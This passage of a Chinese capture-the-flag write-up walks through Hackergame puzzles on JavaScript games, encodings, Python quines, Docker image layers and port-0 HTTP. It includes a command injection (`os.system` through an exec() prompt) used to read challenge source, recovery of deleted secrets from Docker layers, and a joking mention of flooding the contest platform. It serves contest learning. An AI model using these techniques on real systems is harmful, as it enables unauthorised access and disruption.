}}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 